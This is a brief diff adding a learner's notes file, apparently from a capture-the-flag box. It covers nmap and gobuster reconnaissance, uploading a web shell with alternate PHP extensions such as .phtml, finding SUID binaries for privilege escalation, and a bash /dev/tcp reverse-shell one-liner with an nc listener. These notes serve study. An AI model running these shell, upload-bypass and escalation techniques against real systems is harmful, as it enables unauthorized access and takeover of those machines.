@@ -1,0 +1,43 @@
+Methodology
+
+- Look for open services via nmap
+- Dir bruteforce via gobuster
+- Upload shell using .phtml
+- Escalate via suid
+
+
+Learning
+
+- if .php is not allowed try using different format such as .php2,.php3,.php4,.phtml etc
+
+- SUID allows an user to execute files/binaries as file owner
+  To find files with SUID
+  "find / -user root -perm -4000 -print 2>/dev/null"
+  Common vulnerable binaries
+
+    Nmap
+    Vim
+    find
+    Bash
+    More
+    Less
+    Nano
+    cp
+    systemctl
+    many more
+    gtfo bins great resource for this
+
+- nc -lvnp (Very useful)
+- open a shell and listen to specific tcp port one liner
+  "bash -c "bash -i >& /dev/tcp/localhost/port 0<&1"
+
+Bash and Linux knowledge learnt
+
+SUID can be set with 4000
+&0 , &1 , &2.... are file discriptor
+
+
+refercence
+https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01
+https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
+https://linuxconfig.org/how-to-write-a-simple-systemd-service
